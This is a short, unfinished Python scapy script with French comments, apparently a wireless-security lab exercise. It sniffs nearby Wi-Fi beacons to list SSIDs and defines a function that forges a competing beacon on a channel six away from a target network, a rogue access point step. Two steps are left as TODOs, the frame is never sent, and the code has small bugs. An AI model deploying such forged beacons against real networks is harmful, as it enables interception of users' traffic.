from scapy.all import *

# Dresser une liste des SSID disponibles à proximité
ssids = []
def handle_packet(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt.getlayer(Dot11Elt).info.decode()
            if ssid not in ssids:
                ssids.append(ssid)
sniff(iface=ifname, prn=handle_packet)

# Présenter à l'utilisateur la liste, avec les numéros de canaux et les puissances
# TODO

# Permettre à l'utilisateur de choisir le réseau à attaquer
# TODO

# Générer un beacon concurrent annonçant un réseau sur un canal différent se trouvant à 6 canaux de séparation du réseau original
def concurrent_beacon(ssid, channel, ifname):
    channel = (channel + 6) % 14
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    channel = Dot11Elt(ID="DSset", info=chr(channel))
    return RadioTap()/dot11/beacon/essid/channel
